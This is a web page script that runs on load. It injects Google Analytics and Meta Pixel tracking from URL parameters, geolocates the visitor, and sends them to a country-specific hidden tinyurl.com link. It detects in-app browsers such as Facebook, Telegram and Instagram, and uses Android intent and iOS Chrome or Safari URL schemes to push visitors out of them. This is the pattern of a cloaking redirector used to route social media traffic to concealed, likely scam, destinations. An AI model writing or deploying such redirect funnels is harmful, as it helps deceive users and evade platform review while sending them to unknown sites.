<script>
// Prevent page from being cached
window.addEventListener('beforeunload', function() {});

// Global variables for analytics setup tracking
let analyticsSetup = false; // Flag to prevent duplicate setup

// Function to setup analytics with validation
function setupAnalytics(measurementId, metaPixelId) {
    if (analyticsSetup) return;

    // Google Analytics
    if (measurementId) {
        if (/^\d+$/.test(measurementId)) measurementId = 'G-' + measurementId;
        if (!/^G-[A-Z0-9]+$/.test(measurementId) && !/^UA-\d+-\d+$/.test(measurementId)) return;
        const script = document.createElement('script');
        script.async = true;
        script.src = `https://www.googletagmanager.com/gtag/js?id=${measurementId}`;
        document.head.appendChild(script);
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', measurementId);
        window.gtag = gtag;
    }

    // Meta Pixel
    if (metaPixelId) {
        if (!/^\d+$/.test(metaPixelId)) return;
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', metaPixelId);
        fbq('track', 'PageView');
        const noscript = document.createElement('noscript');
        const img = document.createElement('img');
        img.height = "1"; img.width = "1"; img.style.display = "none";
        img.src = `https://www.facebook.com/tr?id=${metaPixelId}&ev=PageView&noscript=1`;
        noscript.appendChild(img);
        document.head.appendChild(noscript);
        window.fbq = fbq;
    }

    analyticsSetup = true;
}

// === Geo Filter + Redirect Logic ===
function handleRedirectLogic() {
    if (window.backButtonRedirectInProgress) return;

    const urlParams = new URLSearchParams(window.location.search);
    const measurementId = urlParams.get("ga");
    const metaPixelId = urlParams.get("pixel");
    const backUrl = urlParams.get("backUrl");

    // Setup analytics immediately
    setupAnalytics(measurementId, metaPixelId);

    // --- GEO Filter ---
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
          let redirectUrl;

          switch (data.country_code) {
              case "DE":
                  redirectUrl = "https://tinyurl.com/5xtrreff";  // Germany traffic
                  break;
              case "CH":
                  redirectUrl = "https://tinyurl.com/45kfw9eu";  // Switzerland traffic
                  break;
              case "NL":
                  redirectUrl = "https://tinyurl.com/37n8z7jj";  // Netherlands traffic
                  break;
              default:
                  redirectUrl = "https://tinyurl.com/2v9w4xk5";  // Other countries
          }

          // Pass redirectUrl into the full redirect flow
          runRedirectFlow(redirectUrl, backUrl);
      })
      .catch(err => {
          console.error("Geo API error:", err);
          runRedirectFlow("https://tinyurl.com/5xtrreff", backUrl);
      });
}

// === Full Redirect Flow (Your Original Logic) ===
function runRedirectFlow(redirectUrl, backUrl) {
    // Your original in-app detection + default browser redirect logic
    const isInWebView = isWebView();
    const currentUrl = window.location.href;

    function detectDevice() {
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        if (/android/i.test(ua)) return 'Android';
        if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return 'iOS';
        return 'Desktop';
    }

    function detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.match(/chrome|chromium|crios/i) && !ua.match(/edg/i)) return "Chrome";
        if (ua.match(/firefox|fxios/i)) return "Firefox";
        if (ua.match(/safari/i) && !ua.match(/chrome|crios|fxios|opr|edg/i)) return "Safari";
        if (ua.match(/opr\//i)) return "Opera";
        if (ua.match(/edg/i)) return "Edge";
        if (ua.match(/msie|trident/i)) return "Internet Explorer";
        if (isFbBrowser()) return "Facebook";
        if (isTelegramBrowser()) return "Telegram";
        return "Unknown";
    }

    function isFbBrowser() { return /FBAN|FBAV/i.test(navigator.userAgent); }
    function isTelegramBrowser() {
        const ua = navigator.userAgent;
        return /AppleWebKit\/605\.1\.15/.test(ua) && /Mobile\/22E240/.test(ua) && /Safari\/604\.1/.test(ua) &&
               !/CriOS|FxiOS/.test(ua);
    }

    function isWebView() {
        const ua = navigator.userAgent;
        return (window.hasOwnProperty('webkit') && window.webkit.hasOwnProperty('messageHandlers')) ||
               (navigator.hasOwnProperty('standalone') && !navigator.standalone && !/CriOS/.test(ua)) ||
               (typeof window.webkit !== 'undefined' && !/CriOS/.test(ua)) ||
               (window.webkit && window.webkit.messageHandlers && !/CriOS/.test(ua)) ||
               isFbBrowser() || isTelegramBrowser() ||
               /Instagram|Twitter|LinkedIn|Pinterest|Snapchat|WhatsApp|Messenger|Line|WeChat|Viber|KakaoTalk|Discord|Slack|TikTok|Reddit|Tumblr|Medium|Quora|Pocket|Flipboard|Feedly|Inoreader|NewsBlur|TheOldReader|Bloglovin|Netvibes|MyYahoo|StartPage|DuckDuckGo|Ecosia|Qwant|Brave|Vivaldi|SamsungBrowser|MiuiBrowser|UCBrowser|Opera Mini|Opera Touch|Samsung Internet|QQBrowser|BaiduBrowser|Maxthon|Puffin|Dolphin|Ghostery/i.test(ua);
    }

    // Android / iOS / Desktop redirect functions
    function androidIntentRedirect(url){ try{ const t = new URL(url); window.location.href=`intent://${t.host}${t.pathname}${t.search}#Intent;scheme=${t.protocol.replace(':','')};package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(url)};end`; }catch(e){window.location.href=url;} }
    function androidChromeRedirect(url){ try{window.location.href=`googlechrome://${url.replace(/^https?:\/\//,'')}`;}catch(e){window.location.href=url;} }
    function androidDirectRedirect(url){ window.location.href = url; }
    function iosChromeRedirect(url){ try{window.location.href=`googlechrome://${url.replace(/^https?:\/\//,'')}`;}catch(e){window.location.href=url;} }
    function iosSafariRedirect(url){ try{window.location.href=`x-safari-${url}`;}catch(e){window.location.href=url;} }
    function iosDirectRedirect(url){ window.location.href=url; }
    function handleAndroidRedirect(url){ let timeouts=[]; function vc(){ if(document.hidden) timeouts.forEach(clearTimeout); } document.addEventListener('visibilitychange', vc); timeouts.push(setTimeout(()=>{androidIntentRedirect(url)},100)); timeouts.push(setTimeout(()=>{androidDirectRedirect(url)},1000)); }
    function handleIOSRedirect(url){ const browser=detectBrowser(); let timeouts=[]; function vc(){if(document.hidden) timeouts.forEach(clearTimeout);} document.addEventListener('visibilitychange', vc); if(browser!=="Unknown"&&!isWebView()){iosDirectRedirect(url); return;} timeouts.push(setTimeout(()=>{iosChromeRedirect(url)},400)); timeouts.push(setTimeout(()=>{iosSafariRedirect(url)},600)); timeouts.push(setTimeout(()=>{iosDirectRedirect(url)},1000)); }
    function handleDesktopRedirect(url){ window.location.href=url; }

    function performRedirect(url){
        const device = detectDevice();
        const formattedRedirectUrl = url.startsWith('http') ? url : `https://${url}`;
        switch(device){
            case 'Android': handleAndroidRedirect(formattedRedirectUrl); break;
            case 'iOS': handleIOSRedirect(formattedRedirectUrl); break;
            default: handleDesktopRedirect(formattedRedirectUrl); break;
        }
    }

    // Add delay if backUrl exists to allow back button registration
    if(backUrl && !isWebView()){
        setTimeout(()=>{ performRedirect(redirectUrl); }, 500);
    } else {
        performRedirect(redirectUrl);
    }
}

// Run the redirect logic
document.addEventListener("DOMContentLoaded", handleRedirectLogic);
window.addEventListener("pageshow", function(event){ handleRedirectLogic(); });
window.addEventListener("pagehide", function(){});
</script>
